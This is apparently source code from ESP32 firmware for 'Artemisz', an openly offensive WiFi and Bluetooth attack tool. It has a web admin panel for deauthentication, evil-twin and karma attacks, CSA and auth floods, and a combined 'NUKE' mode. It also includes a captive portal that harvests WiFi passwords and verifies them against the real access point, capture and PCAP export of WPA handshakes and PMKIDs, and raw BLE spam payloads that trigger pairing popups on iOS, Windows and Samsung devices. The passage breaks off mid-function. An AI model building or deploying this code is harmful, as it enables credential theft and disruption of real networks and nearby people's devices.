.cnt{max-width:960px;margin:0 auto;padding:1em}
.crd{background:#111119;border:1px solid #1a1a2e;border-radius:10px;padding:1.3em;margin-bottom:1em}
.crd h2{font-size:.82rem;color:#e94560;margin-bottom:.8em;padding-bottom:.5em;border-bottom:1px solid #1a1a2e;font-weight:600;letter-spacing:.1em;text-transform:uppercase}
.inf{font-size:.78rem;line-height:2;color:#556}
.inf b{color:#e94560;font-weight:500}
.tbl{overflow-x:auto;margin:0 -.4em;padding:0 .4em}
table{width:100%;border-collapse:separate;border-spacing:0 3px}
th{background:#0d0d16;color:#e94560;padding:10px;text-align:left;font-size:.62rem;text-transform:uppercase;letter-spacing:.12em}
td{padding:10px;font-size:.78rem;background:#0c0c14}
tr:hover td{background:#141424}
.ssid{color:#ddd;font-weight:500;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sig{font-size:.72rem;white-space:nowrap}
.mac{font-family:Consolas,monospace;font-size:.64rem;color:#445}
.ch{text-align:center;color:#778}
button{padding:7px 16px;border:none;border-radius:5px;font-size:.68rem;font-weight:600;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;transition:all .15s;color:#778;background:#151520}
button:hover{background:#1e1e30;color:#ccc;transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,0,0,.4)}
.grn{background:linear-gradient(135deg,#1db954,#1ed760)!important;color:#000!important;box-shadow:0 2px 8px rgba(29,185,84,.25)}
.sel{background:linear-gradient(135deg,#e94560,#c23152)!important;color:#fff!important;box-shadow:0 2px 8px rgba(233,69,96,.2)}
.sel:hover{box-shadow:0 4px 15px rgba(233,69,96,.35)!important}
.sel[disabled]{opacity:.35;cursor:not-allowed;transform:none!important;box-shadow:none!important}
.act{display:flex;gap:10px;flex-wrap:wrap}
.badge{display:inline-block;padding:3px 10px;border-radius:4px;font-size:.62rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase}
.v{background:rgba(29,185,84,.12);color:#1db954}
.u{background:rgba(233,69,96,.12);color:#e94560}
.ft{text-align:center;padding:1.5em;color:#1e1e2e;font-size:.65rem;letter-spacing:.15em}
@media(max-width:640px){
.hdr{padding:1.4em .8em}
.hdr h1{font-size:1.4rem;letter-spacing:.3em}
.cnt{padding:.6em}
.crd{padding:1em}
.mac,.mac-h{display:none}
td,th{padding:8px 6px}}
</style>
</head>
<body>
<div class='hdr'>
<h1>Artemisz</h1>
<p>Network Security Assessment &bull; by ssnrshnn</p></div>
<div class='cnt'>
<div class='crd'><h2>Quick Start</h2><div class='inf'>
<b>1.</b> Select a target network below<br>
<b>2.</b> Start <b>Deauth</b> to disconnect clients<br>
<b>3.</b> Start <b>Evil Twin</b> to clone the AP<br>
<b>4.</b> Credentials appear in results<br>
<b>&bull;</b> Reconnect after toggling Evil Twin
</div></div>
<div class='crd'><h2>Network Scanner</h2>
<div class='tbl'><table>
)=====";

// Fix #10: check HTTP Basic Auth for the admin panel
bool isAuthenticated() {
  if (!webServer.authenticate(ADMIN_USER, ADMIN_PASS)) {
    webServer.requestAuthentication(BASIC_AUTH, "Artemisz Admin", "Authentication required");
    return false;
  }
  return true;
}

void handleAdmin() {
  if (!isAuthenticated()) return;
  bool wasActive = hotspot_active;
  hotspot_active = false;
  handleIndex();
  // Restore unless handleIndex toggled the state (hotspot/karmaclone)
  if (!hotspot_active && !webServer.hasArg("hotspot") && !webServer.hasArg("karmaclone")) {
    hotspot_active = wasActive;
  }
}

// Captive portal detection — lightweight 302 redirect to trigger OS sign-in popup
// Must be tiny responses — during Evil Twin memory is tight from deauth+DNS+HTTP
void handleCaptivePortal() {
  if (hotspot_active) {
    webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.sendHeader("Pragma", "no-cache");
    webServer.sendHeader("Expires", "-1");
    webServer.sendHeader("Location", "http://192.168.4.1/");
    webServer.send(302, "text/plain", "redirect");
  } else {
    handleIndex();
  }
}
// Android-specific: return 200 (not 204) to trigger "Sign in to network"
void handleCaptiveAndroid() {
  if (hotspot_active) {
    webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.send(200, "text/html",
      "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1/'></head>"
      "<body>Redirecting...</body></html>");
  } else {
    handleIndex();
  }
}
// Catch-all for unregistered URLs — during Evil Twin redirect everything to portal
void handleNotFound() {
  if (hotspot_active) {
    webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.sendHeader("Location", "http://192.168.4.1/");
    webServer.send(302, "text/plain", "redirect");
  } else {
    handleIndex();
  }
}

void handleIndex() {
  // Fix #10: protect admin panel with Basic Auth
  if (!hotspot_active && !isAuthenticated()) return;

  // Admin-only actions — guarded so captive portal victims can't toggle attacks.
  // During evil twin, admin forms post to /admin which clears hotspot_active first.
  if (!hotspot_active) {
    if (webServer.hasArg("ap")) {
      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
          _selectedNetwork = _networks[i];
          clearClients();
        }
      }
    }

    if (webServer.hasArg("deauth")) {
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
        deauthAllActive = false;
        if (!hotspot_active) syncAPChannel();
      } else if (webServer.arg("deauth") == "stop") {
        deauthing_active = false;
      }
    }

    if (webServer.hasArg("deauthall")) {
      if (webServer.arg("deauthall") == "start") {
        deauthAllActive = true;
        deauthing_active = false;
        if (!hotspot_active) syncAPChannel();
        _deauthRobinIdx = 0;
      } else if (webServer.arg("deauthall") == "stop") {
        deauthAllActive = false;
      }
    }

    if (webServer.hasArg("rescan")) {
      performScan();
    }

    if (webServer.hasArg("clearcreds")) {
      _credCount = 0;
      preferences.begin("art-creds", false);
      preferences.clear();
      preferences.end();
      Serial.println("[*] All credentials cleared");
    }

    if (webServer.hasArg("karma")) {
      if (webServer.arg("karma") == "start") karmaActive = true;
      else if (webServer.arg("karma") == "stop") karmaActive = false;
    }

    if (webServer.hasArg("clearprobes")) {
      _probeCount = 0;
      memset(_probes, 0, sizeof(_probes));
    }

    if (webServer.hasArg("clearhs")) {
      _handshakeCount = 0;
      memset(_handshakes, 0, sizeof(_handshakes));
    }

    if (webServer.hasArg("beaconspam")) {
      if (webServer.arg("beaconspam") == "start") beaconSpamActive = true;
      else if (webServer.arg("beaconspam") == "stop") beaconSpamActive = false;
    }

    if (webServer.hasArg("probeflood")) {
      if (webServer.arg("probeflood") == "start") probeFloodActive = true;
      else probeFloodActive = false;
    }
    if (webServer.hasArg("randombeacon")) {
      if (webServer.arg("randombeacon") == "start") randomBeaconActive = true;
      else randomBeaconActive = false;
    }
    if (webServer.hasArg("apclone")) {
      if (webServer.arg("apclone") == "start") apCloneSpamActive = true;
      else apCloneSpamActive = false;
    }
    if (webServer.hasArg("rickroll")) {
      if (webServer.arg("rickroll") == "start") rickRollActive = true;
      else rickRollActive = false;
    }
    if (webServer.hasArg("blespam")) {
      bleSpamType = constrain(webServer.arg("blespam").toInt(), 0, 2);
      bleSpamActive = true;
    }
    if (webServer.hasArg("blestop")) {
      bleSpamActive = false;
      stopBLE();
    }
    if (webServer.hasArg("csa")) {
      if (webServer.arg("csa") == "start" && _selectedNetwork.ssid.length() > 0) {
        csaAttackActive = true;
        // Pick a random target channel different from AP's
        do { _csaTargetCh = random(1, 14); } while (_csaTargetCh == _selectedNetwork.ch);
        if (!hotspot_active) syncAPChannel();
      } else { csaAttackActive = false; }
    }
    if (webServer.hasArg("authflood")) {
      if (webServer.arg("authflood") == "start" && _selectedNetwork.ssid.length() > 0) {
        authFloodActive = true;
        if (!hotspot_active) syncAPChannel();
      } else { authFloodActive = false; }
    }
    if (webServer.hasArg("nuke")) {
      if (webServer.arg("nuke") == "start" && _selectedNetwork.ssid.length() > 0) {
        nukeActive = true; deauthing_active = true; csaAttackActive = true; authFloodActive = true;
        deauthAllActive = false;
        do { _csaTargetCh = random(1, 14); } while (_csaTargetCh == _selectedNetwork.ch);
        if (!hotspot_active) syncAPChannel();
      } else {
        nukeActive = false; deauthing_active = false; csaAttackActive = false; authFloodActive = false;
      }
    }
    if (webServer.hasArg("deauthdetect")) {
      if (webServer.arg("deauthdetect") == "start") { deauthDetectActive = true; _deauthDetected = 0; }
      else deauthDetectActive = false;
    }
    if (webServer.hasArg("clearpmkid")) {
      _pmkidCount = 0;
      memset(_pmkids, 0, sizeof(_pmkids));
    }

    if (webServer.hasArg("karmaclone")) {
      int idx = webServer.arg("karmaclone").toInt();
      if (idx >= 0 && idx < _probeCount) {
        String probedSSID = String(_probes[idx].ssid);
        hotspot_active = true;
        uint8_t cloneCh = 1;
        for (int i = 0; i < MAX_NETWORKS; i++) {
          if (_networks[i].ssid == probedSSID) {
            _selectedNetwork = _networks[i];
            cloneCh = _networks[i].ch;
            deauthing_active = true;
            _etGraceUntil = millis() + 5000;
            _lastStationCount = 0;
            break;
          }
        }
        switchAPConfig(probedSSID.c_str(), NULL, cloneCh);
      }
    }

    if (webServer.hasArg("hotspot")) {
      if (webServer.arg("hotspot") == "start") {
        hotspot_active = true;
        deauthing_active = true;
        _etGraceUntil = millis() + 5000;  // 5s grace for captive portal detection
        _lastStationCount = 0;
        switchAPConfig(_selectedNetwork.ssid.c_str(), NULL, _selectedNetwork.ch);
      } else if (webServer.arg("hotspot") == "stop") {
        hotspot_active = false;
        switchAPConfig("Artemisz", "Eviltwin", 1);
      }
      updateDisplay();
      return;
    }
  }

  if (!hotspot_active) {
    // Fix #7: chunked streaming — avoids building one huge String in heap
    webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
    webServer.send(200, "text/html", "");

    // Static header (from const char[] in flash)
    webServer.sendContent(_tempHTML);

    // Dynamic network rows
    webServer.sendContent("<tr><th>Network</th><th>Signal</th><th class='mac-h'>BSSID</th><th>Ch</th><th></th></tr>");
    for (int i = 0; i < MAX_NETWORKS; ++i) {
      if (_networks[i].ssid == "") break;
      String ssidDisp = _networks[i].ssid;
      if (ssidDisp.length() > 18) ssidDisp = ssidDisp.substring(0, 18) + "..";
      String sigClr;
      int rssi = _networks[i].rssi;
      if (rssi > -50) sigClr = "#1db954";
      else if (rssi > -70) sigClr = "#f0a030";
      else sigClr = "#e94560";
      String bssid = bytesToStr(_networks[i].bssid, 6);
      String row = "<tr><td class='ssid'>" + ssidDisp + "</td>"
        "<td class='sig'><span style='color:" + sigClr + "'>" + String(rssi) + "</span> dBm</td>"
        "<td class='mac'>" + bssid + "</td>"
        "<td class='ch'>" + String(_networks[i].ch) + "</td><td>"
        "<form method='post' action='/admin?ap=" + bssid + "'>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bssid) {
        row += "<button class='grn'>Selected</button>";
      } else {
        row += "<button>Select</button>";
      }
      row += "</form></td></tr>";
      webServer.sendContent(row);
    }

    // Attack controls
    String deauthLabel  = deauthing_active ? "Stop Deauth"    : "Start Deauth";
    String deauthAction = deauthing_active ? "stop"           : "start";
    String dAllLabel    = deauthAllActive  ? "Stop Deauth-All": "Deauth All";
    String dAllAction   = deauthAllActive  ? "stop"           : "start";
    String twinLabel    = hotspot_active   ? "Stop Evil-Twin" : "Start Evil-Twin";
    String twinAction   = hotspot_active   ? "stop"           : "start";
    String spamLabel    = beaconSpamActive ? "Stop Spam"      : "Beacon Spam";
    String spamAction   = beaconSpamActive ? "stop"           : "start";
    String disabled     = (_selectedNetwork.ssid == "") ? " disabled" : "";

    String controls = "</table></div></div><div class='crd'><h2>Attack Controls</h2><div class='act'>"
      "<form method='post' action='/admin?deauth=" + deauthAction + "'>"
      "<button class='sel'" + disabled + ">" + deauthLabel + "</button></form>"
      "<form method='post' action='/admin?deauthall=" + dAllAction + "'>"
      "<button class='sel'>" + dAllLabel + "</button></form>"
      "<form method='post' action='/admin?hotspot=" + twinAction + "'>"
      "<button class='sel'" + disabled + ">" + twinLabel + "</button></form>"
      "<form method='post' action='/admin?beaconspam=" + spamAction + "'>"
      "<button class='sel'>" + spamLabel + "</button></form>"
      "<form method='post' action='/admin?rescan=1'>"
      "<button>Rescan Networks</button></form>"
      "</div></div>";
    webServer.sendContent(controls);

    // Advanced Attacks card
    {
      String pfLabel = probeFloodActive ? "Stop Flood" : "Probe Flood";
      String pfAction = probeFloodActive ? "stop" : "start";
      String rbLabel = randomBeaconActive ? "Stop RndBeacon" : "Random Beacon";
      String rbAction = randomBeaconActive ? "stop" : "start";
      String acLabel = apCloneSpamActive ? "Stop Clone" : "AP Clone";
      String acAction = apCloneSpamActive ? "stop" : "start";
      String rrLabel = rickRollActive ? "Stop RickRoll" : "Rick Roll";
      String rrAction = rickRollActive ? "stop" : "start";
      String ddLabel = deauthDetectActive ? "Stop Detect" : "Deauth Detect";
      String ddAction = deauthDetectActive ? "stop" : "start";
      String csaLabel = csaAttackActive ? "Stop CSA" : "CSA Attack";
      String csaAction = csaAttackActive ? "stop" : "start";
      String afLabel = authFloodActive ? "Stop AuthFlood" : "Auth Flood";
      String afAction = authFloodActive ? "stop" : "start";
      String nkLabel = nukeActive ? "Stop Nuke" : "NUKE";
      String nkAction = nukeActive ? "stop" : "start";

      webServer.sendContent("<div class='crd'><h2>Advanced Attacks</h2><div class='act'>"
        "<form method='post' action='/admin?csa=" + csaAction + "'>"
        "<button class='sel'" + disabled + " style='" + String(csaAttackActive ? "background:#e94560;color:#fff" : "") + "'>" + csaLabel + "</button></form>"
        "<form method='post' action='/admin?authflood=" + afAction + "'>"
        "<button class='sel'" + disabled + " style='" + String(authFloodActive ? "background:#e94560;color:#fff" : "") + "'>" + afLabel + "</button></form>"
        "<form method='post' action='/admin?nuke=" + nkAction + "'>"
        "<button class='sel'" + disabled + " style='" + String(nukeActive ? "background:#ff0000;color:#fff;font-weight:bold" : "background:#e94560;color:#fff") + "'>" + nkLabel + "</button></form>"
        "<form method='post' action='/admin?probeflood=" + pfAction + "'>"
        "<button class='sel'>" + pfLabel + "</button></form>"
        "<form method='post' action='/admin?randombeacon=" + rbAction + "'>"
        "<button class='sel'>" + rbLabel + "</button></form>"
        "<form method='post' action='/admin?apclone=" + acAction + "'>"
        "<button class='sel'" + disabled + ">" + acLabel + "</button></form>"
        "<form method='post' action='/admin?rickroll=" + rrAction + "'>"
        "<button class='sel'>" + rrLabel + "</button></form>"
        "<form method='post' action='/admin?deauthdetect=" + ddAction + "'>"
        "<button class='sel'>" + ddLabel + "</button></form>"
        "</div>");
      if (deauthDetectActive && _deauthDetected > 0) {
        webServer.sendContent("<p style='color:#e94560;font-size:.82rem;margin-top:.6em'>WARNING: "
          + String(_deauthDetected) + " deauth frames detected! (RSSI: " + String(_deauthLastRSSI) + " dBm)</p>");
      }
      webServer.sendContent("</div>");
    }

    // BLE Spam card
    {
      webServer.sendContent("<div class='crd'><h2>BLE Spam</h2><div class='act'>"
        "<form method='post' action='/admin?blespam=0'>"
        "<button class='sel'>Sour Apple</button></form>"
        "<form method='post' action='/admin?blespam=1'>"
        "<button class='sel'>Swiftpair</button></form>"
        "<form method='post' action='/admin?blespam=2'>"
        "<button class='sel'>Samsung</button></form>"
        "<form method='post' action='/admin?blestop=1'>"
        "<button>Stop BLE</button></form>"
        "</div>");
      if (bleSpamActive) {
        const char* bleNames[] = {"Sour Apple (iOS)", "Swiftpair (Windows)", "Samsung Galaxy"};
        webServer.sendContent("<p style='color:#1db954;font-size:.78rem;margin-top:.6em'>Active: "
          + String(bleNames[bleSpamType]) + "</p>");
      }
      webServer.sendContent("</div>");
    }

    // Karma Attack card
    {
      String karmaLabel  = karmaActive ? "Stop Karma"  : "Start Karma";
      String karmaAction = karmaActive ? "stop"         : "start";
      webServer.sendContent("<div class='crd'><h2>Karma Attack</h2><div class='act'>"
        "<form method='post' action='/admin?karma=" + karmaAction + "'>"
        "<button class='sel'>" + karmaLabel + "</button></form>"
        "<form method='post' action='/admin?clearprobes=1'>"
        "<button>Clear Probes</button></form></div>");
      if (_probeCount > 0) {
        webServer.sendContent("<div class='tbl' style='margin-top:.8em'><table>"
          "<tr><th>Client</th><th>Probed SSID</th><th>RSSI</th><th>Hits</th><th></th></tr>");
        for (int i = 0; i < _probeCount; i++) {
          String cMAC = bytesToStr(_probes[i].clientMAC, 6);
          String pSSID = htmlEscape(String(_probes[i].ssid));
          webServer.sendContent("<tr><td class='mac'>" + cMAC + "</td>"
            "<td class='ssid'>" + pSSID + "</td>"
            "<td class='sig'>" + String(_probes[i].rssi) + " dBm</td>"
            "<td>" + String(_probes[i].count) + "</td>"
            "<td><form method='post' action='/admin?karmaclone=" + String(i) + "'>"
            "<button>Clone</button></form></td></tr>");
        }
        webServer.sendContent("</table></div>");
      } else {
        webServer.sendContent("<p style='color:#556;font-size:.78rem;margin-top:.6em'>No probe requests captured yet. Devices nearby will appear here.</p>");
      }
      webServer.sendContent("</div>");
    }

    // Handshake Capture card
    {
      webServer.sendContent("<div class='crd'><h2>Handshake Capture (EAPOL)</h2>");
      int readyCount = 0;
      for (int i = 0; i < _handshakeCount; i++)
        if ((_handshakes[i].msgMask & 0x03) == 0x03) readyCount++;
      if (_handshakeCount > 0) {
        webServer.sendContent("<div class='tbl'><table>"
          "<tr><th>AP BSSID</th><th>Client</th><th>Messages</th><th>Status</th></tr>");
        for (int i = 0; i < _handshakeCount; i++) {
          String bss = bytesToStr(_handshakes[i].bssid, 6);
          String cli = bytesToStr(_handshakes[i].client, 6);
          String msgs;
          for (int m = 0; m < 4; m++)
            if (_handshakes[i].msgMask & (1 << m)) { if (msgs.length()) msgs += ","; msgs += String(m+1); }
          bool complete = (_handshakes[i].msgMask & 0x03) == 0x03;
          String st = complete ? "<span class='badge v'>Ready</span>" : "<span class='badge u'>Partial</span>";
          webServer.sendContent("<tr><td class='mac'>" + bss + "</td><td class='mac'>" + cli + "</td>"
            "<td>" + msgs + "</td><td>" + st + "</td></tr>");
        }
        webServer.sendContent("</table></div>"
          "<div class='act' style='margin-top:.8em'>"
          "<a href='/pcap'><button class='grn'>Download PCAP</button></a>"
          "<a href='/hccapx'><button class='grn'>Download HCCAPX</button></a>"
          "<form method='post' action='/admin?clearhs=1'>"
          "<button style='background:#2a1520;color:#e94560'>Clear Handshakes</button></form></div>");
      } else {
        webServer.sendContent("<p style='color:#556;font-size:.78rem'>No handshakes captured. Select a target and start deauth to force re-authentication.</p>");
      }
      webServer.sendContent("</div>");
    }

    // PMKID Capture card
    {
      webServer.sendContent("<div class='crd'><h2>PMKID Capture</h2>");
      if (_pmkidCount > 0) {
        webServer.sendContent("<div class='tbl'><table>"
          "<tr><th>AP BSSID</th><th>Client</th><th>PMKID</th></tr>");
        for (int i = 0; i < _pmkidCount; i++) {
          String bss = bytesToStr(_pmkids[i].bssid, 6);
          String cli = bytesToStr(_pmkids[i].client, 6);
          String pmk;
          for (int j = 0; j < 16; j++) {
            if (_pmkids[i].pmkid[j] < 0x10) pmk += "0";
            pmk += String(_pmkids[i].pmkid[j], HEX);
          }
          webServer.sendContent("<tr><td class='mac'>" + bss + "</td><td class='mac'>" + cli
            + "</td><td style='font-family:monospace;font-size:.64rem;color:#1db954'>" + pmk + "</td></tr>");
        }
        webServer.sendContent("</table></div>"
          "<div class='act' style='margin-top:.8em'>"
          "<form method='post' action='/admin?clearpmkid=1'>"
          "<button style='background:#2a1520;color:#e94560'>Clear PMKIDs</button></form></div>");
      } else {
        webServer.sendContent("<p style='color:#556;font-size:.78rem'>No PMKIDs captured. "
          "Select a target and start deauth &mdash; PMKIDs appear in EAPOL msg1.</p>");
      }
      webServer.sendContent("</div>");
    }

    // Captured credentials
    if (_credCount > 0) {
      webServer.sendContent("<div class='crd'><h2>Captured Credentials</h2>"
        "<div class='tbl'><table><tr><th>#</th><th>Network</th><th>Password</th><th>Status</th></tr>");
      for (int i = 0; i < _credCount; i++) {
        String statusCell = _credLog[i].verified
          ? "<span class='badge v'>Verified</span>"
          : "<span class='badge u'>Failed</span>";
        webServer.sendContent("<tr><td>" + String(i+1) + "</td><td>" +
          htmlEscape(_credLog[i].ssid) + "</td><td>" + htmlEscape(_credLog[i].password) +
          "</td><td>" + statusCell + "</td></tr>");
      }
      webServer.sendContent("</table></div>"
        "<div style='margin-top:.8em'><form method='post' action='/admin?clearcreds=1'>"
        "<button style='background:#2a1520;color:#e94560'>Clear All Credentials</button></form></div>"
        "</div>");
    }

    webServer.sendContent("<div class='ft'>&copy; ssnrshnn &middot; All rights reserved</div></div></body></html>");
    webServer.sendContent(""); // end chunked transfer

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      // Pause all attacks while verifying password against real AP
      _etGraceUntil = millis() + 15000; // 15s grace for WiFi.begin() to connect
      _awaitingVerification = true;
      _verifyStartTime = millis();
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      Serial.printf("[ET] Verifying password '%s' — deauth paused\n", _tryPassword.c_str());
      webServer.send(200, "text/html", posted());
    } else {
      webServer.send(200, "text/html", index());
    }
  }

  if (webServer.hasArg("deauth") || webServer.hasArg("deauthall") || webServer.hasArg("hotspot") || webServer.hasArg("ap") || webServer.hasArg("rescan") || webServer.hasArg("clearcreds") || webServer.hasArg("karma") || webServer.hasArg("clearhs") || webServer.hasArg("clearprobes") || webServer.hasArg("karmaclone") || webServer.hasArg("beaconspam") || webServer.hasArg("probeflood") || webServer.hasArg("randombeacon") || webServer.hasArg("apclone") || webServer.hasArg("rickroll") || webServer.hasArg("blespam") || webServer.hasArg("blestop") || webServer.hasArg("deauthdetect") || webServer.hasArg("clearpmkid") || webServer.hasArg("csa") || webServer.hasArg("authflood") || webServer.hasArg("nuke")) {
    updateDisplay();
  }
}


String bytesToStr(const uint8_t* b, uint32_t size) {
  if (size > 20) size = 20;  // guard the stack buffer below (20*3 + 1 <= 64)
  char buf[64];
  artemisz::bytesToHex(b, size, buf, /*colon=*/true);
  return String(buf);
}

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint16_t _deauthSeqNum = 0;

String htmlEscape(const String& s) {
  String out = s;
  out.replace("&", "&amp;");
  out.replace("<", "&lt;");
  out.replace(">", "&gt;");
  out.replace("\"", "&quot;");
  out.replace("'", "&#39;");
  return out;
}

// Karma — send beacon frames to advertise probed SSIDs
// Cache AP MAC once — avoids esp_wifi_get_mac() syscall per beacon frame
static uint8_t _cachedAPMAC[6] = {0};
static bool _apMACCached = false;
static const uint8_t _defaultRates[] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};

void sendKarmaBeacon(const char* ssid) {
  int ssidLen = strlen(ssid);
  if (ssidLen == 0 || ssidLen > 32) return;
  uint8_t beacon[128];
  memset(beacon, 0, sizeof(beacon));
  if (!_apMACCached) {
    esp_wifi_get_mac(WIFI_IF_AP, _cachedAPMAC);
    _cachedAPMAC[0] &= 0xFE;
    _apMACCached = true;
  }
  // Vary BSSID per SSID so each appears as a different AP
  uint8_t fakeMAC[6];
  memcpy(fakeMAC, _cachedAPMAC, 6);
  uint8_t hash = 0;
  for (int i = 0; i < ssidLen; i++) hash ^= ssid[i];
  fakeMAC[5] = hash;
  // Frame control: beacon
  beacon[0] = 0x80; beacon[1] = 0x00;
  memset(beacon + 4, 0xFF, 6);       // DA: broadcast
  memcpy(beacon + 10, fakeMAC, 6);   // SA
  memcpy(beacon + 16, fakeMAC, 6);   // BSSID
  uint64_t ts = (uint64_t)micros();
  memcpy(beacon + 24, &ts, 8);       // Timestamp
  beacon[32] = 0x64; beacon[33] = 0x00; // Beacon interval 100 TU
  beacon[34] = 0x31; beacon[35] = 0x04; // Capability: ESS + short preamble
  int offset = 36;
  beacon[offset++] = 0x00; beacon[offset++] = (uint8_t)ssidLen;
  memcpy(beacon + offset, ssid, ssidLen); offset += ssidLen;
  beacon[offset++] = 0x01; beacon[offset++] = 0x08; // Supported rates
  memcpy(beacon + offset, _defaultRates, 8); offset += 8;
  beacon[offset++] = 0x03; beacon[offset++] = 0x01; // DS Parameter
  beacon[offset++] = _hopChannel > 0 ? _hopChannel : 1;
  esp_wifi_80211_tx(WIFI_IF_AP, beacon, offset, false);
}

// Serve captured EAPOL handshakes as a PCAP file download
void handlePcapDownload() {
  if (!isAuthenticated()) return;
  int totalPkts = 0;
  for (int i = 0; i < _handshakeCount; i++)
    for (int m = 0; m < 4; m++)
      if (_handshakes[i].pkts[m].len > 0) totalPkts++;
  if (totalPkts == 0) {
    webServer.send(200, "text/plain", "No handshakes captured yet.");
    return;
  }
  WiFiClient client = webServer.client();
  // PCAP global header (serialized by the tested artemisz_core library)
  uint8_t pcapHdr[artemisz::PCAP_GLOBAL_HEADER_LEN];
  artemisz::pcapGlobalHeader(pcapHdr);
  int totalSize = artemisz::PCAP_GLOBAL_HEADER_LEN;
  for (int i = 0; i < _handshakeCount; i++)
    for (int m = 0; m < 4; m++)
      if (_handshakes[i].pkts[m].len > 0)
        totalSize += artemisz::PCAP_RECORD_HEADER_LEN + _handshakes[i].pkts[m].len;
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: application/octet-stream");
  client.println("Content-Disposition: attachment; filename=handshakes.pcap");
  client.print("Content-Length: "); client.println(totalSize);
  client.println("Connection: close");
  client.println();
  client.write(pcapHdr, artemisz::PCAP_GLOBAL_HEADER_LEN);
  uint32_t tsSec = millis() / 1000;
  for (int i = 0; i < _handshakeCount; i++) {
    for (int m = 0; m < 4; m++) {
      uint16_t pLen = _handshakes[i].pkts[m].len;
      if (pLen == 0) continue;
      uint8_t pH[artemisz::PCAP_RECORD_HEADER_LEN];
      uint32_t usec = m * 100000;
      artemisz::pcapRecordHeader(pH, tsSec, usec, pLen, pLen);
      client.write(pH, artemisz::PCAP_RECORD_HEADER_LEN);
      client.write(_handshakes[i].pkts[m].data, pLen);
    }
    tsSec++;
  }
}

// ========== BLE Spam Attacks ==========
static void _bleGapCallback(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  if (event == ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT) {
    esp_ble_adv_params_t advParams = {};
    advParams.adv_int_min = 0x20;
    advParams.adv_int_max = 0x40;
    advParams.adv_type = ADV_TYPE_NONCONN_IND;
    advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
    advParams.channel_map = ADV_CHNL_ALL;
    esp_ble_gap_start_advertising(&advParams);
  }
}

void initBLE() {
  if (_bleInitialized) return;
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  if (esp_bt_controller_init(&bt_cfg) != ESP_OK) { Serial.println("[-] BT init fail"); return; }
  if (esp_bt_controller_enable(ESP_BT_MODE_BLE) != ESP_OK) { Serial.println("[-] BT enable fail"); return; }
  if (esp_bluedroid_init() != ESP_OK) { Serial.println("[-] Bluedroid init fail"); return; }
  if (esp_bluedroid_enable() != ESP_OK) { Serial.println("[-] Bluedroid enable fail"); return; }
  esp_ble_gap_register_callback(_bleGapCallback);
  _bleInitialized = true;
  Serial.println("[*] BLE initialized");
}

void stopBLE() {
  if (!_bleInitialized) return;
  esp_ble_gap_stop_advertising();
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  _bleInitialized = false;
  Serial.println("[*] BLE stopped");
}

void sendBLESpam() {
  if (!_bleInitialized) { initBLE(); }
  if (!_bleInitialized) return;

  // Random BLE address for each burst
  uint8_t bleMac[6];
  for (int i = 0; i < 6; i++) bleMac[i] = random(256);
  bleMac[0] |= 0xC0; // Random static address
  esp_ble_gap_set_rand_addr(bleMac);

  uint8_t advData[31];
  uint8_t advLen = 0;

  switch (bleSpamType) {
    case 0: { // Sour Apple — iOS Nearby Action popup
      uint8_t actions[] = {0x09, 0x13, 0x27, 0x0B, 0x0C, 0x0D, 0x14, 0x07, 0x05, 0x01};
      uint8_t apple[] = {
        0x02, 0x01, 0x06,
        0x11, 0xFF, 0x4C, 0x00,
        0x0F, 0x05, 0xC1,
        actions[random(0, 10)],
        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
        0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
      };
      advLen = sizeof(apple);
      memcpy(advData, apple, advLen);
      break;
    }
    case 1: { // Microsoft Swiftpair — Windows pairing popup
      const char* names[] = {"AirPods Pro", "Bose QC45", "JBL Flip 6", "Sony WH-1000", "Beats Solo", "Galaxy Buds"};
      const char* name = names[random(0, 6)];
      uint8_t nLen = strlen(name);
      uint8_t header[] = {0x03, 0x03, 0x2C, 0xFE, 0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80};
      advLen = sizeof(header);
      memcpy(advData, header, advLen);
      advData[advLen++] = nLen + 1;
      advData[advLen++] = 0x09; // Complete Local Name
      memcpy(advData + advLen, name, nLen);
      advLen += nLen;
      break;
    }
    case 2: { // Samsung Galaxy — device pairing popup
      uint8_t models[][2] = {{0x01,0xEE},{0x02,0x5A},{0x03,0x01},{0x01,0x01},{0x05,0x01},{0x07,0x01}};
      int mIdx = random(0, 6);
      uint8_t sam[] = {
        0x02, 0x01, 0x06,
        0x0B, 0xFF, 0x75, 0x00,
        0x42, 0x09, 0x01, 0x00, 0x00, 0x9A,
        models[mIdx][0], models[mIdx][1]
      };
      advLen = sizeof(sam);
      memcpy(advData, sam, advLen);
      break;
    }
  }

  esp_ble_gap_config_adv_data_raw(advData, advLen);
}

// ========== Probe Request Flood ==========
void sendProbeFlood() {
  uint8_t probe[64];
  memset(probe, 0, sizeof(probe));
  probe[0] = 0x40; probe[1] = 0x00; // Probe request
  memset(probe + 4, 0xFF, 6);       // DA: broadcast
  memset(probe + 16, 0xFF, 6);      // BSSID: broadcast

